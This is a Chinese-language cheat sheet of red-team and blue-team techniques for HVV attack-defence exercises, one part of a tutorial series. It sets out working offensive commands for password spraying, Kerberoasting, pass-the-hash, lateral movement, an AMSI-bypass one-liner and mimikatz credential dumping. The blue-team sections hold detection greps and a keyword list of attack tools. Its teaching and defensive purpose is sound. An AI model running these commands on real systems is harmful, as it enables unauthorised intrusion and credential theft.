# HVV 实战工具与技巧

> 攻防演练中的实战工具集与对抗技巧

---

## 1. 红队武器库

### 信息收集阶段
```bash
# 子域名枚举
subfinder -d target.com -o subs.txt
amass enum -d target.com -o amass.txt
findomain -t target.com -o domains.txt

# 端口扫描
naabu -list subs.txt -p 1-65535 -rate 5000 -o ports.txt

# Web 探测
cat subs.txt | httpx -ports 80,443,8080,8443 -probe \
  -title -tech-detect -status-code -o webs.txt

# JS 中提取 API 端点
cat webs.txt | nuclei -t exposures/configs/ -o configs.txt
katana -list webs.txt -jc -o js_endpoints.txt

# GitHub 信息泄露
trufflehog github --org=target-org
gitleaks detect --source ./repo -v
```

### 初始访问
```bash
# 密码喷洒 (需谨慎!)
crackmapexec smb targets.txt -u users.txt -p 'Spring2024!' --continue-on-success

# Web 漏洞扫描
nuclei -l webs.txt -t cves/ -severity critical,high -o vulns.txt

# AS-REP Roasting
GetNPUsers.py target.local/ -usersfile users.txt -format hashcat
hashcat -m 18200 hashes.txt rockyou.txt --force

# Kerberoasting
GetUserSPNs.py target.local/user:pass -request -outputfile spns.txt
```

### 横向移动
```powershell
# BloodHound 路径分析
SharpHound.exe -c All
# 导入 BloodHound → 查找最短攻击路径

# Pass-the-Hash
crackmapexec smb 10.0.0.0/8 -u admin -H NTLM_HASH --shares

# PSExec 横向
PsExec64.exe \\TARGET -u DOMAIN\admin -p password cmd

# WMI 横向
wmiexec.py DOMAIN/user@TARGET -hashes :NTLM_HASH
```

---

## 2. 蓝队检测技巧

### 日志分析命令
```bash
# Windows 事件日志提取
# 4624: 登录成功, 4625: 登录失败, 4672: 特殊权限
wevtutil qe Security /q:"*[System[EventID=4624]]" /c:100 /f:text

# Linux 认证日志
grep "Failed password" /var/log/auth.log | awk '{print $11}' | sort | uniq -c | sort -rn
lastb | awk '{print $3}' | sort | uniq -c | sort -rn

# Web 攻击日志
grep -E "UNION|SELECT|alert|script|../../" /var/log/nginx/access.log
```

### 实时监控脚本
```python
# 实时检测异常进程
import psutil
import time

baseline = set(p.pid for p in psutil.process_iter())

while True:
    time.sleep(5)
    current = set(p.pid for p in psutil.process_iter())
    new_procs = current - baseline

    for pid in new_procs:
        try:
            p = psutil.Process(pid)
            cmdline = ' '.join(p.cmdline())
            # 检测常见攻击工具
            suspicious = ['mimikatz', 'powershell -enc', 'nc ', 'psexec',
                         'wmiexec', 'bloodhound', 'crackmapexec']
            if any(s in cmdline.lower() for s in suspicious):
                print(f"[ALERT] Suspicious process: {p.name()} ({pid}) {cmdline}")
        except: pass

    baseline = current
```

---

## 3. 对抗技巧

### 红队反检测
```powershell
# AMSI 绕过
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

# 进程注入 (无文件攻击)
# Cobalt Strike: execute-assembly / spawnto
# 使用白名单进程: svchost, rundll32, explorer

# 流量混淆
# 使用域前置 (现多数 CDN 已封堵)
# 使用 Malleable C2 Profile
# DNS 隧道: dnscat2, iodine

# 密码提取
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" exit
```

### 蓝队主动防御
```yaml
HVV 护网清单:
  - 边界加固:
    - [ ] VPN + 强密码 + MFA
    - [ ] 禁止 RDP 直接暴露
    - [ ] WAF 规则: 阻断 SQLi/XSS/RCE Payload
    
  - 内部监控:
    - [ ] 部署 Sysmon + 采集 Windows 事件日志
    - [ ] EDR 安装率 100%
    - [ ] 敏感命令告警 (net user / mimikatz / psexec)
    
  - 应急响应:
    - [ ] 值班表 7×24
    - [ ] 一键断网脚本
    - [ ] 备份就绪 (离线 + 不可篡改)
    
  - 反钓鱼:
    - [ ] 全员安全培训 (识别钓鱼邮件)
    - [ ] SPF/DKIM/DMARC 配置
    - [ ] 邮件附件沙箱检测
```

---

*上一篇：[HVV 攻击技术详解](02-attack-techniques.md)*
